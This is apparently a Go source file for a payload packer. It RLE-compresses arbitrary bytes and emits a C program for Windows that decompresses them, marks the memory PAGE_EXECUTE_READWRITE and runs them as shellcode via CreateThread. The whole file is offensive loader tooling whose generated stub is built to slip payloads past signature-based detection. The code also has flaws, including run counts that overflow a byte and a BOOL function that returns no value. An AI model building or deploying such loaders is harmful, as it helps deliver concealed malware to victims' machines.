package main

import (
	"fmt"
	"log"
)

func compressRLE(data []byte) []byte {
	// Compress data using RLE
	var compressedData []byte
	var count = 1
	for i := 0; i < len(data); i++ {
		// If the next byte is the same as the current byte, increase the count
		if i+1 < len(data) && data[i] == data[i+1] {
			count++
		} else {
			// If the next byte is different, append the current byte and the count
			compressedData = append(compressedData, data[i])
			compressedData = append(compressedData, byte(count))
			count = 1
		}
	}
	return compressedData
}

func compressBinary(data []byte, ctype string) []byte {
	// Compress binary file
	switch ctype {
	case "RLE":
		return compressRLE(data)
	default:
		log.Fatal("Invalid compression type")
		return nil
	}
}

func getDecompressionStubC(data []byte, ctype string) string {
	// Get decompression stub in C
	var decompressionStub string
	switch ctype {
	case "RLE":
		decompressionStub += `#include <Windows.h>
#include <stdio.h>

// Function to decompress RLE data
BOOL decompressRLE(IN INT* compPayload, IN SIZE_T compPayloadSize, IN SIZE_T* sDecompressedSize, OUT PBYTE* pDecompressedPayload) {
    BYTE * payload = NULL;

    // Allocate memory for the decompressed payload
    payload = (BYTE *) VirtualAlloc(NULL, *sDecompressedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (payload == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return;
    }

    // Decompress the payload
    *sDecompressedSize = 0;
    for (int i = 0; i < compPayloadSize; i += 2) {
        for (int j = 0; j < compPayload[i+1]; j++) {
            payload[*sDecompressedSize] = (BYTE) compPayload[i];
            *sDecompressedSize += 1;
        }
    }

    // Set the decompressed payload
    *pDecompressedPayload = payload;

    return;
}

int main() {
    PBYTE pDecompressedPayload = NULL;

    /*-------------------------------------------Generated Data----------------------------------------------*/
`

		decompressedSize := 0
		// Get the decompressed size
		for i := 0; i < len(data); i += 2 {
			decompressedSize += int(data[i+1])
		}

		// Print the compressed data
		decompressionStub += "    INT compPayload[] = {"
		for i := 0; i < len(data); i += 2 {
			if i+2 < len(data) {
				decompressionStub += fmt.Sprintf("%d, %d, ", data[i], data[i+1])
			} else {
				decompressionStub += fmt.Sprintf("%d, %d", data[i], data[i+1])
			}
		}
		decompressionStub += "};\n"
		decompressionStub += fmt.Sprintf("    SIZE_T compPayloadSize = %d;\n", len(data))
		decompressionStub += fmt.Sprintf("    SIZE_T sDecompressedSize = %d;", decompressedSize)
		decompressionStub += `
	/*-------------------------------------------------------------------------------------------------------*/

    decompressRLE(compPayload, compPayloadSize, &sDecompressedSize, &pDecompressedPayload);

    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDecompressedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }

    memcpy(pShellcodeAddress, pDecompressedPayload, sDecompressedSize);
    memset(pDecompressedPayload, '\0', sDecompressedSize);


    DWORD dwOldProtection = NULL;
    if (!VirtualProtect(pShellcodeAddress, sDecompressedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDecompressedPayload);

    return 0;
}
`

	default:
		log.Fatal("Invalid compression type")
		return ""
	}
	return decompressionStub
}

func getDecompressionStub(language string, data []byte, ctype string) string {
	// Get decompression stub
	switch language {
	case "C":
		return getDecompressionStubC(data, ctype)
	default:
		log.Fatal("Language not supported")
		return ""
	}
}
